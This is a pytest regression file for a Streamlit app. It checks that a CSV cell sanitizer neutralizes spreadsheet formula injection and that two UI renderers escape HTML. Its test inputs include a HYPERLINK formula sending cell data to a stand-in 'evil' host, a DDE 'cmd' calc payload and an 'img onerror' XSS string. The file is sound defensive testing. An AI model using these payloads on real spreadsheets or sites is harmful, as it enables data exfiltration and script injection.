"""Formalized versions of the ad hoc repro/verify scripts written
during this project's security-hardening pass. Each test proves one
specific vulnerability stays fixed - not "the code runs," but "the
exact payload that used to get through is neutralized."
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from streamlit.testing.v1 import AppTest

FIXTURES = Path(__file__).resolve().parent / "fixtures"


# ---------------------------------------------------------------------
# CSV / spreadsheet formula injection (modules/history.py)
# ---------------------------------------------------------------------

def test_sanitize_cell_neutralizes_formula_payloads():
    from modules.history import _sanitize_cell

    assert _sanitize_cell('=HYPERLINK("http://evil/?"&A1,"click")').startswith("'=")
    assert _sanitize_cell("+1+1").startswith("'+")
    assert _sanitize_cell("-cmd|'/C calc'!A1").startswith("'-")
    assert _sanitize_cell("@SUM(1,1)").startswith("'@")


def test_sanitize_cell_leaves_normal_values_untouched():
    from modules.history import _sanitize_cell

    assert _sanitize_cell("Aerospace bracket, high yield") == "Aerospace bracket, high yield"
    assert _sanitize_cell("2026-08-11 10:00:00") == "2026-08-11 10:00:00"


def test_import_history_csv_sanitizes_formula_payloads():
    """End-to-end: a malicious CSV import comes back neutralized in
    the stored history, not just when passed directly to the helper."""
    at = AppTest.from_file(str(FIXTURES / "history_csv_injection_app.py"))
    at.run(timeout=30)
    outputs = "\n".join(m.value for m in at.markdown)
    assert "query_sanitized: True" in outputs
    assert "material_sanitized: True" in outputs
    assert "query_value: '=HYPERLINK" in outputs
    assert "material_value: '+1+1" in outputs


# ---------------------------------------------------------------------
# Cross-site scripting (modules/ui.py)
# ---------------------------------------------------------------------

def test_render_status_banner_escapes_html():
    at = AppTest.from_file(str(FIXTURES / "status_banner_xss_app.py"))
    at.run(timeout=30)
    assert not at.exception
    outputs = "\n".join(m.value for m in at.markdown)
    # The escaped form must be present and the raw, executable tag must not be.
    assert "&lt;img" in outputs
    assert "<img src=x onerror=alert(1)>" not in outputs


def test_render_pros_cons_escapes_html():
    at = AppTest.from_file(str(FIXTURES / "pros_cons_xss_app.py"))
    at.run(timeout=30)
    assert not at.exception
    outputs = "\n".join(m.value for m in at.markdown)
    assert "&lt;img" in outputs
    assert "<img src=x onerror=alert(1)>" not in outputs
